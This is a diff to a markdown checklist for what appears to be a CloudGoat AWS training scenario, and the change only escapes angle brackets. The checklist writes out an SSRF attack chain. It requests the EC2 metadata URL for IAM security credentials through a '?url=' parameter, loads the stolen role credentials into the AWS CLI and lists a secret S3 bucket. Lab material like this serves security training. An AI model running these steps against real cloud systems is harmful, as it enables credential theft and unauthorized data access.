@@ -19,8 +19,8 @@ Completed: 4
 - [ ] aws configure --profile cglambda
 - [ ] aws ec2 describe-instances --profile cglambda
 - [x] Go to http://<EC2 instance IP\> // Access
-- [x] http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ //SSRF
-- [x] http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name\> //Exploit step
+- [x] http://<EC2 instance IP\>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ //SSRF
+- [x] http://<EC2 instance IP\>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name\> //Exploit step
 - [x] Then Add the EC2 instance credentials to your AWS CLI credentials file at ~/.aws/credentials) // Implicit: Assume role
 - [ ] aws s3 ls --profile cgec2role
 - [ ] aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-\<cloudgoat_id\>
